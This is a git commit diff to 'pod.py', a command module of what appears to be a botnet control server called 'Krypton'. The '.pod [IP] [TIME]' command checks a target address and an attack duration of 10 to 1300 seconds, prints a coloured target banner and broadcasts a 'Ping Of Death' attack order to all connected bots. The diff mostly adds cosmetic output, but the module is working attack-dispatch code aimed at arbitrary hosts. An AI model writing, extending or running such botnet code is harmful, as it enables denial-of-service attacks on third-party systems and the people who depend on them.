aafcbb0d2f6d8687474f94f4dbc484b5e2892568
cirqueira <118860604+CirqueiraDev@users.noreply.github.com>
2024-01-22 16:25:05 -0300

    Update pod.py

--- src/Commands/Methods_L3/pod.py
+++ src/Commands/Methods_L3/pod.py
@@ -4,13 +4,32 @@ def pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, d
     if len(args) == 3:
         ip = args[1]
         secs = args[2]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s  IP:%s %s
+            %sTIME:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX,
+                             Fore.GREEN,
+                             Fore.LIGHTBLACK_EX, 
+                             Fore.CYAN, 
+                             Fore.LIGHTWHITE_EX, 
+                             ip, 
+                             Fore.CYAN, 
+                             Fore.LIGHTWHITE_EX, 
+                             secs, 
+                             Fore.CYAN, 
+                             Fore.LIGHTWHITE_EX, 
+                             'Ping Of Death')
+        
         if validate_ip(ip):
-                if validate_time(secs):
-                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
-                    broadcast(data)
-                else:
-                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
+            if validate_time(secs):
+                for x in xxxx.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+                send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
+                broadcast(data)
+            else:
+                send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
         else:
             send(client, Fore.RED + '\nInvalid IP-address\n')
     else:
-        send(client, '\nUsage: .pod [IP] [TIME]\n')
+        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.pod [IP] [TIME]\n')
